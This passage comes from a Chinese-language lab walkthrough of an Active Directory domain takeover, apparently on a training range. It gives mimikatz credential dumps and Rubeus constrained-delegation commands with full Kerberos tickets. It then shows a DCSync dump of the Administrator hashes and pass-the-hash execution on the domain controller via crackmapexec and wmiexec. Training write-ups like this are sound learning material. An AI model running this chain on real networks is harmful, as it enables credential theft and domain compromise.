     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:05
SID               : S-1-5-19
    msv :
    tspkg :
    wdigest :
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    kerberos :
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 23023 (00000000:000059ef)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2024/7/23 13:47:50
SID               :
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
    kerberos :
    ssp :
    credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MSSQLSERVER$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2024/7/23 13:47:50
SID               : S-1-5-18
    msv :
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : mssqlserver$
     * Domain   : XIAORANG.LAB
     * Password : (null)
    ssp :
    credman :
```

</details>

在其中，注意到 `MSSQLSERVER$` 用户的信息

```plaintext
Authentication Id : 0 ; 6686789 (00000000:00660845)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/7/23 16:38:37
SID               : S-1-5-90-0-2
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :
```

## 172.22.2.16 MSSQLSERVER 约束委派攻击

申请 `MSSQLSERVER$` 用户的 TGT

```shell
PS C:\Users\randark\Desktop> .\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:302393922f8920b52b9724a8e3d735bb /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
______        _
(_____ \      | |
_____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/
v2.2.0
[*] Action: Ask TGT
[*] Using rc4_hmac hash: 302393922f8920b52b9724a8e3d735bb
[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\MSSQLSERVER$'
[*] Using domain controller: 172.22.2.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3xYlFPMuxg+URvDENLbnsYToalRMBIQv3+wPp0mmlPG1P3VOYTrGrN6n9N9Pz3WSDnqFESdC98yPX8orXx+fVrC3B8Nha8rPTGt2L68RjvHPz7ruEOLWfaugwmF4sgUJVdYiAGVUl/w/mR5O++dJy3iM3qD+PRoDEKgMAY+Prwwl+lh3uu8vV+FlxAG/LH9+artYi+OFHOiPZge+B9hTtUWVub4vOANOKsVr3MXuXWb4OCU6Ge48BkH5Y8KOFVVO+OE851Cfj8oU6Z0JIpxNG3GbLmE5RYv6yRQ/rkuS5QYugygc82QJ33nBRlspqV3zWc8ELmG4rku/bFTtH1Tc/w7E4wGxOmtwjEQQZOduvlaYk2L4XpcdXFAPCcPA9V9ygDmeXYk44Ug4Lp+SzN80W1hdT74+j9cQ5jTGgxo0fwzTtPi0sWez8V9L1jSn141G/dmL0t/872BbGaaadl+jMlnWHQQdaNjjONNvgaknIru8tpnl6KX3UAzpfKkqnqbFRIdGPUibu2n9JRKWSU2FpqXGQ+WfvEgi5i8H083oz/d64old9vCKFCV05QPvSQojJy5D/fE2YOab6ghIt5dwVEHYjYoj06Q47fyRZp0fdYwab0JnPoslmYuAph5yTF5kC9qfxSElk4lp72cs/AmMvZ75I0unII120QKYSiJik+LiIsbqLC5G+jNh13J2twk+XAVcm1fP6uycGNz7tr6u/Pvj4dgbKYpqoEvbDHrAjj/u7qG/wXHuMuaSVGB8t16d6QhhmdXyeyw6ThPIen0+eNN9y15749MEVWq/ONfQb2eyxSgesVi77x5aCdNnKqc70Joik1v/IgDfdrE4kus94wCZ8l5NcnDGmM/QMwrJK4dDpRq3YCwQX9TqoTJA74HcaOOgRxytQohHQCWRcct4c7w5sRMxkmX0qbO3MuHq5n6Jafrzo7jc7ZuH+ft/XoPHqgBcLFh7Mv4lObktLi60E5C7fwgHuQSYEAoGTz+bv8XfbC+YslucIQOruTGKrQQhfeYnraSOMHy5eHwOL3I3zeD2GUPGye4RUnsXpG7QlkdMkxyV9nl7nQAb6AwlBXq87EyzDhaBz0wUZOH+n2tI5Yru4LjAr3MuV/PUZg2BjsfKCBwKKhC24qwBAWCV0zssuqLecqFwqyGcZidETlqFh8sNDbq9MPn8pZIVth87duyuOPmpgCkdpObU6fjZ+lHpqWab2TgQj/2UCyvzqIDF5RJsKACtrrNXLvKGaE7TFMMsY/JGI6866s+e8DmnG/RdOGGSbLykEk/muZ1rDBzsoGafQTtAES5eB0MlbC3+eDJlJ3rLM+4ap8zSzm/wIPAsDzIAU3Lpv9IELbwdESsqBVun6xRaTmGFsxg+pt3zjv59McFcduKzBhAZMpedFauvMpQt7K1tFj8jxCvYEkIkrnmfXf3boRC9scJAa1s2+AhRf3LuLWD/PVR/xX5FqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBD9PJUn8/+BepPyM2/eCaZioQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDcyMzA5MDc0MlqmERgPMjAyNDA3MjMxOTA3NDJapxEYDzIwMjQwNzMwMDkwNzQyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
ServiceName              :  krbtgt/xiaorang.lab
ServiceRealm             :  XIAORANG.LAB
UserName                 :  MSSQLSERVER$
UserRealm                :  XIAORANG.LAB
StartTime                :  2024/7/23 17:07:42
EndTime                  :  2024/7/24 3:07:42
RenewTill                :  2024/7/30 17:07:42
Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
KeyType                  :  rc4_hmac
Base64(key)              :  /TyVJ/P/gXqT8jNv3gmmYg==
ASREP (key)              :  302393922F8920B52B9724A8E3D735BB
```

获取到 TGT 之后，请求对 LDAP 域控的票据

```shell
PS C:\Users\randark\Desktop> .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3xYlFPMuxg+URvDENLbnsYToalRMBIQv3+wPp0mmlPG1P3VOYTrGrN6n9N9Pz3WSDnqFESdC98yPX8orXx+fVrC3B8Nha8rPTGt2L68RjvHPz7ruEOLWfaugwmF4sgUJVdYiAGVUl/w/mR5O++dJy3iM3qD+PRoDEKgMAY+Prwwl+lh3uu8vV+FlxAG/LH9+artYi+OFHOiPZge+B9hTtUWVub4vOANOKsVr3MXuXWb4OCU6Ge48BkH5Y8KOFVVO+OE851Cfj8oU6Z0JIpxNG3GbLmE5RYv6yRQ/rkuS5QYugygc82QJ33nBRlspqV3zWc8ELmG4rku/bFTtH1Tc/w7E4wGxOmtwjEQQZOduvlaYk2L4XpcdXFAPCcPA9V9ygDmeXYk44Ug4Lp+SzN80W1hdT74+j9cQ5jTGgxo0fwzTtPi0sWez8V9L1jSn141G/dmL0t/872BbGaaadl+jMlnWHQQdaNjjONNvgaknIru8tpnl6KX3UAzpfKkqnqbFRIdGPUibu2n9JRKWSU2FpqXGQ+WfvEgi5i8H083oz/d64old9vCKFCV05QPvSQojJy5D/fE2YOab6ghIt5dwVEHYjYoj06Q47fyRZp0fdYwab0JnPoslmYuAph5yTF5kC9qfxSElk4lp72cs/AmMvZ75I0unII120QKYSiJik+LiIsbqLC5G+jNh13J2twk+XAVcm1fP6uycGNz7tr6u/Pvj4dgbKYpqoEvbDHrAjj/u7qG/wXHuMuaSVGB8t16d6QhhmdXyeyw6ThPIen0+eNN9y15749MEVWq/ONfQb2eyxSgesVi77x5aCdNnKqc70Joik1v/IgDfdrE4kus94wCZ8l5NcnDGmM/QMwrJK4dDpRq3YCwQX9TqoTJA74HcaOOgRxytQohHQCWRcct4c7w5sRMxkmX0qbO3MuHq5n6Jafrzo7jc7ZuH+ft/XoPHqgBcLFh7Mv4lObktLi60E5C7fwgHuQSYEAoGTz+bv8XfbC+YslucIQOruTGKrQQhfeYnraSOMHy5eHwOL3I3zeD2GUPGye4RUnsXpG7QlkdMkxyV9nl7nQAb6AwlBXq87EyzDhaBz0wUZOH+n2tI5Yru4LjAr3MuV/PUZg2BjsfKCBwKKhC24qwBAWCV0zssuqLecqFwqyGcZidETlqFh8sNDbq9MPn8pZIVth87duyuOPmpgCkdpObU6fjZ+lHpqWab2TgQj/2UCyvzqIDF5RJsKACtrrNXLvKGaE7TFMMsY/JGI6866s+e8DmnG/RdOGGSbLykEk/muZ1rDBzsoGafQTtAES5eB0MlbC3+eDJlJ3rLM+4ap8zSzm/wIPAsDzIAU3Lpv9IELbwdESsqBVun6xRaTmGFsxg+pt3zjv59McFcduKzBhAZMpedFauvMpQt7K1tFj8jxCvYEkIkrnmfXf3boRC9scJAa1s2+AhRf3LuLWD/PVR/xX5FqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBD9PJUn8/+BepPyM2/eCaZioQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDcyMzA5MDc0MlqmERgPMjAyNDA3MjMxOTA3NDJapxEYDzIwMjQwNzMwMDkwNzQyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2self request to 172.22.2.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB'
[*] base64(ticket.kirbi):

      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
      VkVSJA==

[*] Impersonating user 'Administrator' to target SPN 'LDAP/DC.xiaorang.lab'
[*] Building S4U2proxy request for service: 'LDAP/DC.xiaorang.lab'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2proxy request to domain controller 172.22.2.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'LDAP/DC.xiaorang.lab':

      doIGhjCCBoKgAwIBBaEDAgEWooIFlTCCBZFhggWNMIIFiaADAgEFoQ4bDFhJQU9SQU5HLkxBQqIiMCCg
      AwIBAqEZMBcbBExEQVAbD0RDLnhpYW9yYW5nLmxhYqOCBUwwggVIoAMCARKhAwIBBKKCBToEggU2Tb/g
      oHCPk2OeFWbFPqmGaLDvubMMDSYoXWvBTmKFcAlsnNtlvB7xIr0F8y93U2A+tdUVkm29qnnpERcWq4mr
      2d0gSVIiThoqUltSbZxb1uNmbAUGNit3velCxLCXUYS5N1giQn4DVtCxFGApu8ofwBmB9XFLe1tgkv9u
      qteqy/lfQXZFABi8iX8yTq9Mn9TiDdLho0a8f2hRbvyDerEMHlhH7BrPWcQ+yvdOVpLqWYjAeGue5x4d
      esl6HYtHMfEAW84wgVTTWDMWF6wnG9H8MMnQvW+iY8urB/UJNy+yum4bdr+rSSTcL+H6+nWASGkhn+So
      E4iZW1eczRkFw1YSoidcPqM+A7HG1lx6dZlYcONjQuYiPIPeClrSlXlYrXvm87HT31HdoK0ezY8jZlwf
      E6v4XVEoIjZO4VNvx9ZYIMf9JQGtK9KYFecZtfD04qpfHokbxN4qrG+vRixWH+2QXrzFfvTPm6ZVz+4n
      8Kmekpf2EwgzrBQftA9IeAm6MAxIbrNMfUBh+1/nnwSPp3aIXCRHkl0mHDF6E7NftklcHQpQaEdVUjJs
      F1g1Rx2G0GNmDqmqnJ0y2yPHsqjIRX2/mpYGnL2LH0I0VekcQPp+Ds+dZf4fOfZZdvZiWPNkTjo0Zxn6
      QLUmDPgvk+PtcXm14eNdzY3p5Sjr/6LGUpRzANW0dZ+W2tVPBUt4o5e0ow4USOTYr6t9JukToOn9Ptue
      +Fa93PmM1LIJ0c97byWfPLnJHWd2k1+EUytX9QqGHKKmQSlFXD/MeDa+2UgPuR2WWs9LsRW8FBev6Now
      I6z5Vjum/73QRlWS5NJPki5GJhDWscvedjw55f4rJUd4SSIXfDejCFKFY+IRdsLtyFQ3UfncKwtwptf6
      I+aCQbl6cAjmRswrktY2CMoHeDojBS0Z6Q99E01a6Ip6+/znOogLXUWiHl2+uTqZbXVvJpt90GRV46Yv
      YjwR53AvMw7IfPxuHeFxtxxRrm/84Nn9uuHKECBGGigKu+lZ4FKVT4/49icBGnHgL2F9MXewCFI0GisJ
      sc5efAVVk1HFqxeFUYatxnWnpSYZLCyWwgIoeoniIQ1VUV0xiS0ec4TOKIjFzWsLVhkeLevCHrLJYwaB
      oLhxGbaE2Z27cdYbznEzgGdxt1/sO8KTvSqzRz3h5qy6ALDZQO0vZ7GrLwDaDsygMiC9xliGyUrLn6s5
      40hrdKIc4U013r2Ff9InVHc+2vbZVKz2Sp9PdnWX7+m/aavhZDCx/CflwJoVFWNIcVMvo/9c/uOQVxxt
      1cBqZdkVdVEdGKG3bpFWVy+TpfwS3ZZDGgeBMF8v6iGixb7hu6knqcVzQ95Z93VcBLLGGa1hB2OegGh9
      h0+/amkh5TTH8MSjX/q0MrXYlRzYOpXW4IF2Rp+lM3cFmMqUsvB0N4G5dURjdMIZjobS/FkyFmk3acGv
      UpScVSXdpvf1zwiTGiruhnSidoY84udfs2zPxbZBXPalPrBMeDvWhXDlZLd+I8LcMioXoqIMgZdIl5yS
      QbIhnyRmDNGnIVT6I1jt0xw3IghadCz1rX9ajMMUPqHm7JacSEko/wHjsa0JG16a3BIWlqoW7cCUCPJp
      SA54ZUWWvSzG8UTv9wSH8fBUWrVvZnnRey4dENfW4W0B6EVIxI0YXXIFv6hL1JLLENgrtEh9zTRs3fdO
      3ven8vSXuGueInudMi+sMb/Vj4eksVWlaIKC9cMwScImK5kmogFpn2nlVTJKE6cFo6bvHYIKAizZmIJr
      100FlLaXXHzQZNijgdwwgdmgAwIBAKKB0QSBzn2ByzCByKCBxTCBwjCBv6AbMBmgAwIBEaESBBCt8CBO
      J45D6ci5ljDFxaPToQ4bDFhJQU9SQU5HLkxBQqIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMF
      AEClAAClERgPMjAyNDA3MjMwOTEyMjdaphEYDzIwMjQwNzIzMTkwNzQyWqcRGA8yMDI0MDczMDA5MDc0
      MlqoDhsMWElBT1JBTkcuTEFCqSIwIKADAgECoRkwFxsETERBUBsPREMueGlhb3JhbmcubGFi
[+] Ticket successfully imported!
```

票据导入到本地，得到 LDAP 服务的权限之后，借助 LDAP 服务的 DCSync 权限，获取到域内用户的哈希

```shell
mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:Administrator
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC.xiaorang.lab' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 (USER_OBJECT)
User Account Control : 00000200 (NORMAL_ACCOUNT)
Account expiration   : 1601/1/1 8:00:00
Password last change : 2024/7/23 13:48:27
Object Security ID   : S-1-5-21-2704639352-1689326099-2164665914-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 1a19251fbd935969832616366ae3fe62
    ntlm- 0: 1a19251fbd935969832616366ae3fe62
    ntlm- 1: 1a19251fbd935969832616366ae3fe62
    lm  - 0: 9f564e07753c58a5468689fada1558a9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 04358a87db5de589af073ecbe8735c34

* Primary:Kerberos-Newer-Keys *
    Default Salt : XIAORANG.LABAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3f91ec8a41fe7f074cd9dde729759b53f8b02a2804f3317400efca39ad9d71b4
      aes128_hmac       (4096) : 4f61f64c4df0a8b43c55a82a03f53283
      des_cbc_md5       (4096) : e302404989526829

* Primary:Kerberos *
    Default Salt : XIAORANG.LABAdministrator
    Credentials
      des_cbc_md5       : e302404989526829

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  f49b5f58ea17c16d84b6caed3329e3eb
    02  2981a4cb7b89f9bdbe88b7e0a4be4bcd
    03  de5143c5f9abb8f5b1d0d9f26240bf68
    04  f49b5f58ea17c16d84b6caed3329e3eb
    05  7b4675c811c27b8b18d04ca1fddeab41
    06  0b634747c142cc2c998e873593275a6d
    07  9a850919e1ce9eb117bab41421d98841
    08  3b8e33ee6be631a58fb99ad840c4053a
    09  cba8c3b50ecfac00fb2913c49d92fa37
    10  36cb83756fcf0726bd045799e5888dac
    11  136f255e1b4e6eea7c1aab41fbca96d9
    12  3b8e33ee6be631a58fb99ad840c4053a
    13  403cb5710544a5276aa1ed5cbb03ef37
    14  3707bc9d95d4e8c470a2efe6bb814886
    15  857cbad29e96529a5366944574b99a6d
    16  311fa13028ceca341a2d20631b89a0c0
    17  50713d47019ffbf289fbf07ed91e34dc
    18  a9390cb585258a8d6f132ad241de172b
    19  06f22a6c8f813dbaa73b3570012f8093
    20  a34809fbce18cec50539070bb75c78bc
    21  61f4e433240a44b9762af3ee8e2fc649
    22  dd45206bb14e3f01247d8ed295a462b2
    23  2bda6c0bd1d840139ecc2d1833aaa5f5
    24  82bb99f494642f0a3f6e29b24da8e3e1
    25  453bb36d447c78063e47a9ca8048e73d
    26  0ee52ce371145abdff3ea8b525b9f80b
    27  3f5cca3b4643f58c14a7093f27b2b604
    28  21f7240d8964d1c31d16488a859eab02
    29  0ef9bbfc7fb4c00d3de5fd0f1d548264
```

得到 `Administrator` 的哈希信息

## 172.22.2.3 DC SMB-exec

```shell
┌──(randark ㉿ kali)-[~/tmp/Yunjing-Brute4Road]
└─$ proxychains4 crackmapexec smb 172.22.2.3 -u administrator -H1a19251fbd935969832616366ae3fe62 -d xiaorang.lab -x "type Users\Administrator\flag\flag04.txt"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.3:445  ...  OK
[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.3:135  ...  OK
SMB         172.22.2.3      445    DC               [*] Windows Server 2016 Datacenter 14393 x64 (name:DC) (domain:xiaorang.lab) (signing:True) (SMBv1:True)
[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.3:445  ...  OK
SMB         172.22.2.3      445    DC               [+] xiaorang.lab\administrator:1a19251fbd935969832616366ae3fe62 (Pwn3d!)
[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.3:135  ...  OK
[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.3:49666  ...  OK
SMB         172.22.2.3      445    DC               [+] Executed command
SMB         172.22.2.3      445    DC               ######:                                               ###   ######:                             ##
SMB         172.22.2.3      445    DC               #######                         ##                   :###   #######                             ##
SMB         172.22.2.3      445    DC               ##   :##                        ##                  .####   ##   :##                            ##
SMB         172.22.2.3      445    DC               ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##
SMB         172.22.2.3      445    DC               ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######
SMB         172.22.2.3      445    DC               #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###
SMB         172.22.2.3      445    DC               #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##
SMB         172.22.2.3      445    DC               ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##
SMB         172.22.2.3      445    DC               ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##
SMB         172.22.2.3      445    DC               ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###
SMB         172.22.2.3      445    DC               ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######
SMB         172.22.2.3      445    DC               ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##
SMB         172.22.2.3      445    DC
SMB         172.22.2.3      445    DC
SMB         172.22.2.3      445    DC               Well done hacking!
SMB         172.22.2.3      445    DC               This is the final flag, you deserve it!
SMB         172.22.2.3      445    DC
SMB         172.22.2.3      445    DC
SMB         172.22.2.3      445    DC               flag04: flag{aee9f5e2-5fe3-4c76-8a55-2b3bb1bd281a}
```

## 172.22.2.3 DC WMI 横向

```shell
┌──(randark ㉿ kali)-[~/tmp/Yunjing-Brute4Road]
└─$ proxychains4 -q impacket-wmiexec -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd Users/Administrator/flag
C:\Users\Administrator\flag>type flag04.txt
 ######:                                               ###   ######:                             ##
 #######                         ##                   :###   #######                             ##
 ##   :##                        ##                  .####   ##   :##                            ##
 ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##
 ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######
 #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###
 #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##
 ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##
